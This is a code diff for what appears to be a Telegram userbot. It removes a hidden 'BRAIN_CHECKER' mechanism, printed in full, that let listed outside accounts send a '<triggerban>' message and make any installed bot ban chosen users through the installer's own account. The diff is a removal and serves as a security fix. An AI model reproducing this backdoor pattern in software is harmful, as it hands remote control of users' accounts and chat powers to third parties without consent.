@@ -155,14 +155,6 @@ async def thanos(bon):
             )
         )
 
-        # ExceptionHandling if the user is a Sudo
-        if bon.sender_id in BRAIN_CHECKER:
-            await bon.respond(
-                "<triggerban> " +
-                str((await bon.get_reply_message()).sender_id)
-            )
-            return
-
         # Delete message and then tell that the command
         # is done gracefully
         await bon.edit("`Banned!`")
@@ -280,37 +272,6 @@ async def unmoot(unmot):
             await unmot.edit("```Unmuted Successfully```")
         except UserIdInvalidError:
             await unmot.edit("`Uh oh my unmute logic broke!`")
-
-
-@bot.on(events.NewMessage(incoming=True, pattern="<triggerban>"))
-async def triggered_ban(triggerbon):
-    """
-    This function is supposed to check if the banned person is a sudo
-    If yes, revoke all the restricts
-    """
-    ban_id = int(triggerbon.text[13:])
-    if triggerbon.sender_id in BRAIN_CHECKER:
-        rights = ChatBannedRights(
-            until_date=None,
-            view_messages=True,
-            send_messages=True,
-            send_media=True,
-            send_stickers=True,
-            send_gifs=True,
-            send_games=True,
-            send_inline=True,
-            embed_links=True,
-        )
-
-        if ban_id in BRAIN_CHECKER:
-            await triggerbon.edit("`Sorry Master!`")
-            return
-
-        sleep(5)
-        await bot(EditBannedRequest(triggerbon.chat_id, ban_id, rights))
-        await triggerbon.delete()
-        await bot.send_message(triggerbon.chat_id,
-                               "Job was done, Master! Gimme Cookies!")
 
 
 @bot.on(events.NewMessage(incoming=True))
